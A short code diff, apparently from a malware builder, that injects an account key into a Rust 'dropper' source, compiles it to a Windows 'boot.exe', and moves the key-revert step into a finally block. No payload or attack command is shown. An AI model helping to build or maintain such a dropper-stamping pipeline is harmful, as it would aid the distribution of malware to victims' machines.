@@ -11,24 +11,25 @@ const DROPPER_DIR = path.join(__dirname, '..', 'dropper');
 
 export async function buildBoot({ key, buildId }) {
     const srcPath = path.join(DROPPER_DIR, 'src', 'main.rs');
-    let code = fs.readFileSync(srcPath, 'utf8');
+    const originalCode = fs.readFileSync(srcPath, 'utf8');
 
-    // Inject key ONLY
-    code = code.replace('__ACCOUNT_KEY__', key);
-    fs.writeFileSync(srcPath, code);
+    try {
+        // Inject key
+        const codeWithKey = originalCode.replace('__ACCOUNT_KEY__', key);
+        fs.writeFileSync(srcPath, codeWithKey);
 
-    console.log('[build] compiling rust dropper...');
-    await execFileP('cargo', ['build', '--release', '--target', 'x86_64-pc-windows-gnu'], {
-        cwd: DROPPER_DIR,
-        timeout: 5 * 60_000,
-    });
+        console.log('[build] compiling rust dropper...');
+        await execFileP('cargo', ['build', '--release', '--target', 'x86_64-pc-windows-gnu'], {
+            cwd: DROPPER_DIR,
+            timeout: 5 * 60_000,
+        });
 
-    const baseExe = path.join(DROPPER_DIR, 'target', 'x86_64-pc-windows-gnu', 'release', 'boot.exe');
-    const launcherBuf = fs.readFileSync(baseExe);
+        const baseExe = path.join(DROPPER_DIR, 'target', 'x86_64-pc-windows-gnu', 'release', 'boot.exe');
+        const launcherBuf = fs.readFileSync(baseExe);
 
-    // Revert key
-    code = code.replace(key, '__ACCOUNT_KEY__');
-    fs.writeFileSync(srcPath, code);
-
-    return launcherBuf;
+        return launcherBuf;
+    } finally {
+        // Revert key safely, even if the build fails
+        fs.writeFileSync(srcPath, originalCode);
+    }
 }
